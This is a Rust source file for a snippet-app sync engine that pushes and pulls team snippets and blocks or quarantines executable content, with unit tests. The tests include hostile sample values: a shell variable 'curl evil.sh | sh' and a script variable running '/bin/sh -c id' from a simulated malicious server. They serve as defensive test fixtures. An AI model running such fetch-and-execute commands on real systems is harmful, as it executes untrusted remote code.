//! The sync engine: a consumer of [`SnippetStore`] that reconciles team-scoped records with a
//! backend over a [`SyncProvider`].
//!
//! Flow per team, per cycle: **pull** (apply everything after our cursor through the store's
//! LWW `apply_remote_*`, which regenerates YAML + notifies the UI for free) → **push** dirty
//! records (`accepted` → acknowledge; `superseded` → apply the server's newer copy) → **pull
//! again** to advance the cursor past our own writes. Offline-first: the dirty flags *are* the
//! queue — nothing is lost if every cycle fails for a week.
//!
//! Scope enforcement lives here: only teams in the server-attested identity (`/v1/me`) are
//! synced, and only records the store reports as dirty *for those teams* are serialized.

use std::sync::{Arc, Mutex};

use snippet_store::{ChangeOrigin, Group, Snippet, SnippetStore};
use sync_proto::{limits, GroupRec, Me, OutcomeStatus, Push, SnippetRec};
use tokio::sync::mpsc;

use crate::auth::AuthProvider;
use crate::http::SyncProvider;
use crate::{Result, SyncError, SyncStatus};

/// Debounce window after a local edit before pushing (collects bursts of edits).
const DEBOUNCE_MS: u64 = 2_000;
/// Retry backoff bounds (exponential, applied on cycle failure).
const BACKOFF_MIN_SECS: u64 = 5;
const BACKOFF_MAX_SECS: u64 = 900;

pub struct SyncEngine {
    store: Arc<SnippetStore>,
    provider: Box<dyn SyncProvider>,
    auth: Box<dyn AuthProvider>,
    status: Mutex<SyncStatus>,
    on_status: Box<dyn Fn(&SyncStatus) + Send + Sync>,
    kick_rx: Mutex<Option<mpsc::UnboundedReceiver<()>>>,
    kick_tx: mpsc::UnboundedSender<()>,
    interval: std::time::Duration,
}

impl SyncEngine {
    /// Wires the engine to the store's change stream. `on_status` is invoked on every status
    /// transition (the Tauri layer forwards it to the UI as an event).
    pub fn new(
        store: Arc<SnippetStore>,
        provider: Box<dyn SyncProvider>,
        auth: Box<dyn AuthProvider>,
        interval: std::time::Duration,
        on_status: Box<dyn Fn(&SyncStatus) + Send + Sync>,
    ) -> Arc<Self> {
        let (kick_tx, kick_rx) = mpsc::unbounded_channel();
        let engine = Arc::new(Self {
            store: store.clone(),
            provider,
            auth,
            status: Mutex::new(SyncStatus { state: "idle".into(), ..Default::default() }),
            on_status,
            kick_rx: Mutex::new(Some(kick_rx)),
            kick_tx: kick_tx.clone(),
            interval,
        });
        // Local mutations kick a debounced sync. Remote-origin events are our own pulls.
        store.add_change_listener(move |ev| {
            if ev.origin == ChangeOrigin::Local {
                let _ = kick_tx.send(());
            }
        });
        engine
    }

    pub fn status(&self) -> SyncStatus {
        self.status.lock().unwrap().clone()
    }

    /// Request an immediate sync (UI "Sync now", app start, post-sign-in).
    pub fn kick(&self) {
        let _ = self.kick_tx.send(());
    }

    /// Roster of a team (server-attested). Used by the Settings → Team sync member panel.
    pub async fn members(&self, team: &str) -> Result<Vec<sync_proto::Member>> {
        let bearer = self.auth.bearer().await?;
        Ok(self.provider.members(&bearer, team).await?.members)
    }

    /// Join another team by redeeming an invite with the credential already signed in — so
    /// membership accumulates instead of one invite replacing the last. Syncs immediately
    /// afterwards so the new team's content lands without waiting for the next tick.
    pub async fn redeem_invite(&self, code: &str) -> Result<sync_proto::Me> {
        let bearer = self.auth.bearer().await?;
        let me = self.provider.redeem_invite(&bearer, code).await?;
        self.set_status(|s| s.identity = Some(me.clone()));
        self.kick();
        Ok(me)
    }

    /// Leave a team. The server drops the membership; locally the caller is responsible for
    /// un-sharing any group that pointed at it (the content stays, it just stops syncing).
    pub async fn leave_team(&self, team: &str) -> Result<()> {
        let bearer = self.auth.bearer().await?;
        self.provider.leave_team(&bearer, team).await?;
        if let Ok(me) = self.provider.me(&bearer).await {
            self.set_status(|s| s.identity = Some(me));
        }
        Ok(())
    }

    pub fn sign_out(&self) {
        self.auth.sign_out();
        self.set_status(|s| {
            s.state = "signedOut".into();
            s.identity = None;
            s.error = None;
        });
    }

    fn set_status(&self, f: impl FnOnce(&mut SyncStatus)) {
        let snapshot = {
            let mut s = self.status.lock().unwrap();
            f(&mut s);
            s.clone()
        };
        (self.on_status)(&snapshot);
    }

    /// The background loop. Runs until the process exits; owns the debounce + interval + backoff
    /// logic. Spawn with `tauri::async_runtime::spawn(engine.run())`.
    pub async fn run(self: Arc<Self>) {
        let mut kick_rx =
            self.kick_rx.lock().unwrap().take().expect("run() may only be called once");
        let mut backoff = BACKOFF_MIN_SECS;
        loop {
            // Wait for a kick or the periodic tick.
            let kicked = tokio::select! {
                k = kick_rx.recv() => k.is_some(),
                _ = tokio::time::sleep(self.interval) => true,
            };
            if !kicked {
                return; // channel closed = engine dropped
            }
            // Debounce: absorb the burst, then drain any queued kicks.
            tokio::time::sleep(std::time::Duration::from_millis(DEBOUNCE_MS)).await;
            while kick_rx.try_recv().is_ok() {}

            match self.sync_once().await {
                Ok(()) => backoff = BACKOFF_MIN_SECS,
                Err(SyncError::SignedOut) | Err(SyncError::Unauthorized) => {
                    self.set_status(|s| {
                        s.state = "signedOut".into();
                        s.identity = None;
                    });
                    backoff = BACKOFF_MIN_SECS;
                }
                Err(e) => {
                    log::warn!("sync cycle failed: {e}");
                    self.set_status(|s| {
                        s.state = "error".into();
                        s.error = Some(e.to_string());
                    });
                    // Exponential backoff with jitter-by-truncation; a fresh local edit can
                    // still kick an earlier retry.
                    tokio::time::sleep(std::time::Duration::from_secs(backoff)).await;
                    backoff = (backoff * 2).min(BACKOFF_MAX_SECS);
                }
            }
        }
    }

    /// One full reconcile cycle across all of the identity's teams.
    pub async fn sync_once(&self) -> Result<()> {
        self.set_status(|s| {
            s.state = "syncing".into();
            s.error = None;
        });

        let bearer = self.auth.bearer().await?;
        // The server derives identity + team membership from the validated credential; the
        // client never decides its own authorization.
        let me: Me = self.provider.me(&bearer).await?;

        for team in &me.teams {
            self.pull_team(&bearer, team).await?;
            self.push_team(&bearer, team).await?;
            self.pull_team(&bearer, team).await?; // advance cursor past our own writes
        }

        self.set_status(|s| {
            s.state = "idle".into();
            s.identity = Some(me.clone());
            s.last_sync = Some(chrono::Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Secs, true));
            s.error = None;
        });
        Ok(())
    }

    async fn pull_team(&self, bearer: &str, team: &str) -> Result<()> {
        loop {
            let since = self.store.sync_cursor(team)?;
            let page = self.provider.changes(bearer, team, since, limits::DEFAULT_PAGE).await?;
            // Groups first so pulled snippets can reference their folder.
            for g in &page.groups {
                self.store.apply_remote_group(&group_from_rec(g))?;
            }
            for s in &page.snippets {
                self.store.apply_remote_snippet(&snippet_from_rec(s))?;
            }
            self.store.set_sync_cursor(team, page.next_cursor)?;
            if !page.more {
                return Ok(());
            }
        }
    }

    async fn push_team(&self, bearer: &str, team: &str) -> Result<()> {
        loop {
            // HARD SCOPE RULE: these queries are the only reads feeding the wire, and they
            // select `team = ?` records exclusively — personal snippets cannot leave the device.
            // On top of that, executable content (command kind / shell/script variables) is
            // excluded here — it must never reach teammates, whatever the server does.
            let snippets: Vec<Snippet> = self
                .store
                .dirty_snippets(team)?
                .into_iter()
                .filter(|s| syncable(s))
                .collect();
            let groups = self.store.dirty_groups(team)?;
            if snippets.is_empty() && groups.is_empty() {
                return Ok(());
            }
            let batch = Push {
                groups: groups.iter().take(limits::MAX_BATCH / 2).map(group_to_rec).collect(),
                snippets: snippets
                    .iter()
                    .take(limits::MAX_BATCH / 2)
                    .map(snippet_to_rec)
                    .collect(),
            };
            let sent_all =
                batch.snippets.len() == snippets.len() && batch.groups.len() == groups.len();
            let ack = self.provider.push(bearer, team, &batch).await?;

            for o in &ack.groups {
                match o.status {
                    OutcomeStatus::Accepted => {
                        if let Some(g) = groups.iter().find(|g| g.id == o.id) {
                            self.store.mark_pushed(
                                snippet_store::ChangeEntity::Group,
                                &g.id,
                                g.version,
                            )?;
                        }
                    }
                    OutcomeStatus::Superseded => {
                        if let Some(rec) = &o.server_record {
                            self.store.apply_remote_group(&group_from_rec(rec))?;
                        }
                    }
                }
            }
            for o in &ack.snippets {
                match o.status {
                    OutcomeStatus::Accepted => {
                        if let Some(s) = snippets.iter().find(|s| s.id == o.id) {
                            self.store.mark_pushed(
                                snippet_store::ChangeEntity::Snippet,
                                &s.id,
                                s.version,
                            )?;
                        }
                    }
                    OutcomeStatus::Superseded => {
                        if let Some(rec) = &o.server_record {
                            self.store.apply_remote_snippet(&snippet_from_rec(rec))?;
                        }
                    }
                }
            }
            if sent_all {
                return Ok(());
            }
            // More than one batch worth of dirt — loop for the rest.
        }
    }
}

// ---- record conversions (store ↔ wire) ---------------------------------------

/// Whether a snippet may leave this device. Command snippets and anything carrying
/// executable variables never sync — the owner's decision is "commands never sync",
/// not "sync with approval". The server rejects these too; this filter must hold even
/// against a server that doesn't.
fn syncable(s: &Snippet) -> bool {
    s.kind != "command" && !snippet_store::has_exec_vars(&s.variables)
}

fn snippet_to_rec(s: &Snippet) -> SnippetRec {
    SnippetRec {
        id: s.id.clone(),
        trigger: s.trigger.clone(),
        replacement: s.replacement.clone(),
        format: s.format.clone(),
        kind: s.kind.clone(),
        variables: s.variables.clone(),
        group_id: s.group_id.clone(),
        app_scope: s.app_scope.clone(),
        owner: s.owner.clone(),
        team: s.team.clone().unwrap_or_default(), // dirty queries guarantee Some
        updated_at: s.updated_at.clone(),
        version: s.version,
        deleted_at: s.deleted_at.clone(),
    }
}

/// Wire → store, with **pull quarantine**: a record arriving with executable content
/// (command kind, or shell/script variables — from a malicious/buggy server or an old
/// one that predates server-side rejection) is defanged before it can touch the engine:
/// the executable variables are stripped, the kind is forced back to `text`, and the
/// snippet arrives disabled for the user to review. The sanitized copy is local-only —
/// applying a remote record acknowledges it as pushed, so it is never re-uploaded.
fn snippet_from_rec(r: &SnippetRec) -> Snippet {
    let executable = r.kind == "command" || snippet_store::has_exec_vars(&r.variables);
    let variables = if executable { None } else { r.variables.clone() };
    let kind = if r.kind == "command" { "text".to_string() } else { r.kind.clone() };
    Snippet {
        id: r.id.clone(),
        trigger: r.trigger.clone(),
        replacement: r.replacement.clone(),
        format: r.format.clone(),
        kind,
        enabled: !executable,
        variables,
        group_id: r.group_id.clone(),
        app_scope: r.app_scope.clone(),
        owner: r.owner.clone(),
        team: Some(r.team.clone()),
        updated_at: r.updated_at.clone(),
        version: r.version,
        deleted_at: r.deleted_at.clone(),
    }
}

fn group_to_rec(g: &Group) -> GroupRec {
    GroupRec {
        id: g.id.clone(),
        name: g.name.clone(),
        sort_order: g.sort_order,
        team: g.team.clone().unwrap_or_default(),
        restricted: false, // restriction is server-managed; clients never assert it
        updated_at: g.updated_at.clone(),
        version: g.version,
        deleted_at: g.deleted_at.clone(),
    }
}

fn group_from_rec(r: &GroupRec) -> Group {
    Group {
        id: r.id.clone(),
        name: r.name.clone(),
        sort_order: r.sort_order,
        team: Some(r.team.clone()),
        updated_at: r.updated_at.clone(),
        version: r.version,
        deleted_at: r.deleted_at.clone(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;
    use std::sync::Mutex as StdMutex;

    /// In-memory protocol-faithful fake server (LWW merge, per-team seq cursor).
    #[derive(Default)]
    struct FakeServer {
        state: StdMutex<FakeState>,
    }
    #[derive(Default)]
    struct FakeState {
        seq: u64,
        snippets: HashMap<String, (u64, SnippetRec)>,
        groups: HashMap<String, (u64, GroupRec)>,
    }

    #[async_trait::async_trait]
    impl SyncProvider for FakeServer {
        async fn me(&self, _bearer: &str) -> Result<Me> {
            Ok(Me {
                sub: "u1".into(),
                email: None,
                teams: vec!["sec".into()],
                roles: Default::default(),
                policy: None,
            })
        }
        async fn changes(&self, _b: &str, team: &str, since: u64, _l: usize) -> Result<sync_proto::Changes> {
            let st = self.state.lock().unwrap();
            let snippets = st
                .snippets
                .values()
                .filter(|(seq, r)| *seq > since && r.team == team)
                .map(|(_, r)| r.clone())
                .collect();
            let groups = st
                .groups
                .values()
                .filter(|(seq, r)| *seq > since && r.team == team)
                .map(|(_, r)| r.clone())
                .collect();
            Ok(sync_proto::Changes { snippets, groups, next_cursor: st.seq, more: false })
        }
        async fn push(&self, _b: &str, _team: &str, batch: &Push) -> Result<sync_proto::PushAck> {
            let mut st = self.state.lock().unwrap();
            let mut ack = sync_proto::PushAck { snippets: vec![], groups: vec![], cursor: 0 };
            for s in &batch.snippets {
                let wins = st.snippets.get(&s.id).map_or(true, |(_, cur)| {
                    sync_proto::lww_wins(&s.updated_at, s.version, &cur.updated_at, cur.version)
                });
                if wins {
                    st.seq += 1;
                    let seq = st.seq;
                    st.snippets.insert(s.id.clone(), (seq, s.clone()));
                    ack.snippets.push(sync_proto::PushOutcome {
                        id: s.id.clone(),
                        status: OutcomeStatus::Accepted,
                        server_record: None,
                    });
                } else {
                    ack.snippets.push(sync_proto::PushOutcome {
                        id: s.id.clone(),
                        status: OutcomeStatus::Superseded,
                        server_record: Some(st.snippets[&s.id].1.clone()),
                    });
                }
            }
            for g in &batch.groups {
                st.seq += 1;
                let seq = st.seq;
                st.groups.insert(g.id.clone(), (seq, g.clone()));
                ack.groups.push(sync_proto::PushOutcome {
                    id: g.id.clone(),
                    status: OutcomeStatus::Accepted,
                    server_record: None,
                });
            }
            ack.cursor = st.seq;
            Ok(ack)
        }
    }

    struct NoAuth;
    #[async_trait::async_trait]
    impl AuthProvider for NoAuth {
        async fn bearer(&self) -> Result<String> {
            Ok("test".into())
        }
        fn sign_out(&self) {}
        fn kind(&self) -> &'static str {
            "test"
        }
    }

    fn engine_for(store: Arc<SnippetStore>, server: Arc<FakeServer>) -> Arc<SyncEngine> {
        struct Shared(Arc<FakeServer>);
        #[async_trait::async_trait]
        impl SyncProvider for Shared {
            async fn me(&self, b: &str) -> Result<Me> {
                self.0.me(b).await
            }
            async fn changes(&self, b: &str, t: &str, s: u64, l: usize) -> Result<sync_proto::Changes> {
                self.0.changes(b, t, s, l).await
            }
            async fn push(&self, b: &str, t: &str, p: &Push) -> Result<sync_proto::PushAck> {
                self.0.push(b, t, p).await
            }
        }
        SyncEngine::new(
            store,
            Box::new(Shared(server)),
            Box::new(NoAuth),
            std::time::Duration::from_secs(3600),
            Box::new(|_| {}),
        )
    }

    /// Two devices, one server: team snippets converge, personal snippets never sync,
    /// tombstones propagate, LWW resolves the conflict.
    #[tokio::test]
    async fn end_to_end_two_stores_converge() {
        let server = Arc::new(FakeServer::default());
        let a = Arc::new(SnippetStore::open_in_memory().unwrap());
        let b = Arc::new(SnippetStore::open_in_memory().unwrap());
        let ea = engine_for(a.clone(), server.clone());
        let eb = engine_for(b.clone(), server.clone());

        // Device A: one personal, one team snippet.
        a.create(snippet_store::NewSnippet {
            trigger: ":personal".into(),
            replacement: "secret".into(),
            ..Default::default()
        })
        .unwrap();
        let team_snip = a
            .create(snippet_store::NewSnippet {
                trigger: ":team".into(),
                replacement: "hello team".into(),
                team: Some("sec".into()),
                ..Default::default()
            })
            .unwrap();

        ea.sync_once().await.unwrap();
        eb.sync_once().await.unwrap();

        // B received ONLY the team snippet.
        let b_all = b.list().unwrap();
        assert_eq!(b_all.len(), 1);
        assert_eq!(b_all[0].trigger, ":team");
        assert_eq!(b_all[0].id, team_snip.id);
        // The personal snippet never reached the server.
        assert!(server.state.lock().unwrap().snippets.values().all(|(_, r)| r.team == "sec"));

        // Conflict: both edit; B's edit is newer → LWW picks B everywhere.
        a.update(&team_snip.id, snippet_store::SnippetUpdate {
            trigger: ":team".into(),
            replacement: "A's edit".into(),
            team: Some("sec".into()),
            ..Default::default()
        })
        .unwrap();
        std::thread::sleep(std::time::Duration::from_millis(5)); // ensure a later timestamp
        b.update(&team_snip.id, snippet_store::SnippetUpdate {
            trigger: ":team".into(),
            replacement: "B's edit".into(),
            team: Some("sec".into()),
            ..Default::default()
        })
        .unwrap();
        ea.sync_once().await.unwrap();
        eb.sync_once().await.unwrap();
        ea.sync_once().await.unwrap();
        assert_eq!(a.get(&team_snip.id).unwrap().unwrap().replacement, "B's edit");
        assert_eq!(b.get(&team_snip.id).unwrap().unwrap().replacement, "B's edit");

        // Tombstone propagates.
        b.soft_delete(&team_snip.id).unwrap();
        eb.sync_once().await.unwrap();
        ea.sync_once().await.unwrap();
        assert!(a.get(&team_snip.id).unwrap().unwrap().deleted_at.is_some());
        assert!(a.list().unwrap().iter().all(|s| s.trigger != ":team"));

        // Groups sync too.
        let g = a.create_group(snippet_store::NewGroup { name: "Shared".into() }).unwrap();
        a.set_group_team(&g.id, Some("sec")).unwrap();
        ea.sync_once().await.unwrap();
        eb.sync_once().await.unwrap();
        assert!(b.list_groups().unwrap().iter().any(|x| x.id == g.id && x.name == "Shared"));
    }

    /// Executable content never crosses the wire: command snippets and shell-var snippets
    /// are excluded from push, and a malicious server's shell-var record is quarantined
    /// (vars stripped, disabled) on pull.
    #[tokio::test]
    async fn executable_content_is_excluded_and_quarantined() {
        let server = Arc::new(FakeServer::default());
        let a = Arc::new(SnippetStore::open_in_memory().unwrap());
        let b = Arc::new(SnippetStore::open_in_memory().unwrap());
        let ea = engine_for(a.clone(), server.clone());
        let eb = engine_for(b.clone(), server.clone());

        // A team'd TEXT snippet carrying a shell var (the pre-Phase-5 hole): must not push.
        a.create(snippet_store::NewSnippet {
            trigger: ":sneaky".into(),
            replacement: "{{out}}".into(),
            team: Some("sec".into()),
            variables: Some(serde_json::json!([
                {"name":"out","type":"shell","params":{"cmd":"curl evil.sh | sh"}}
            ])),
            ..Default::default()
        })
        .unwrap();
        // A command snippet: the store already forces team=None, so it can't even be dirty.
        let cmd = a
            .create(snippet_store::NewSnippet {
                trigger: ":cmd".into(),
                replacement: "date".into(),
                kind: Some("command".into()),
                team: Some("sec".into()), // ignored by the store invariant
                ..Default::default()
            })
            .unwrap();
        assert!(cmd.team.is_none());

        ea.sync_once().await.unwrap();
        assert!(
            server.state.lock().unwrap().snippets.is_empty(),
            "no executable record may reach the server"
        );

        // Malicious server: hand device B a shell-var record directly.
        {
            let mut st = server.state.lock().unwrap();
            st.seq += 1;
            let seq = st.seq;
            st.snippets.insert(
                "evil".into(),
                (seq, SnippetRec {
                    id: "evil".into(),
                    trigger: ":evil".into(),
                    replacement: "{{x}}".into(),
                    format: "plain".into(),
                    kind: "text".into(),
                    variables: Some(serde_json::json!([
                        {"name":"x","type":"script","params":{"args":["/bin/sh","-c","id"]}}
                    ])),
                    group_id: None,
                    app_scope: None,
                    owner: "attacker".into(),
                    team: "sec".into(),
                    updated_at: "2026-07-07T00:00:00.000Z".into(),
                    version: 1,
                    deleted_at: None,
                }),
            );
        }
        eb.sync_once().await.unwrap();
        let evil = b.get("evil").unwrap().expect("record applied (quarantined)");
        assert!(evil.variables.is_none(), "script var must be stripped");
        assert!(!evil.enabled, "quarantined record must arrive disabled");
    }
}
